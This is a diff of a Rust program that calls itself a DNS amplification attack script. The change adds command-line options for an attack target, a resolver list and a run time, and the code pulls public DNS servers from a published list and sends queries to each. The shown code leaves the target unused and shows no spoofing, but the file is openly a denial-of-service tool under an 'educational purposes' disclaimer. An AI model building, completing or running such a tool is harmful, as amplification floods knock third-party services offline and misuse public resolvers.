@@ -1,14 +1,15 @@
 // DNS Amplification Script
 // Author: David Stromberger
 // License: MIT
-// Version: 1.0
+// Version: 0.1.0
 // Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.
 
 use reqwest;
-use std::net::{IpAddr};
+use std::net::IpAddr;
 use std::str::FromStr;
 use tokio;
 use tokio::net::UdpSocket;
+use clap::{Parser, command, arg};
 
 async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
@@ -41,21 +42,40 @@ async fn resolve_dns(server: IpAddr, domain: &str) -> Result<Vec<u8>, std::io::E
     Ok(vec![])
 }
 
-async fn run() -> Result<(), Box<dyn std::error::Error>> {
-    let servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
-
-    println!("{} DNS servers found:", servers.len());
-    for server in servers {
-        let ip_addr = IpAddr::from_str(&server)?;
-        resolve_dns(ip_addr, "google.com").await?;
-        println!("{}: query send", server);
-    }
-
+async fn send_queries(server: String) -> Result<(), Box<dyn std::error::Error>> {
+    let ip_addr = IpAddr::from_str(&server)?;
+    resolve_dns(ip_addr, "google.com").await?;
+    println!("{}: query sent", server);
     Ok(())
+}
+
+#[derive(Parser, Debug)]
+#[command(author, version, about, long_about = None)]
+struct Args {
+    /// Target of the attack
+    #[arg(required = true)]
+    target: String,
+    /// List of dns servers to use
+    #[arg(short, long, required = false)]
+    server_list: String,
+    /// Time the attack should run
+    #[arg(short, long, required = false)]
+    time: u32,
 }
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    run().await?;
+    let args = Args::parse();
+    if args.server_list.is_empty() {
+        let servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
+        println!("{} DNS servers found:", servers.len());
+        for server in &servers {
+            let result = send_queries(server.to_string()).await;
+            if let Err(e) = result {
+                println!("Error sending query to {}: {}", server, e);
+            }
+        }
+        return Ok(());
+    }
     Ok(())
 }
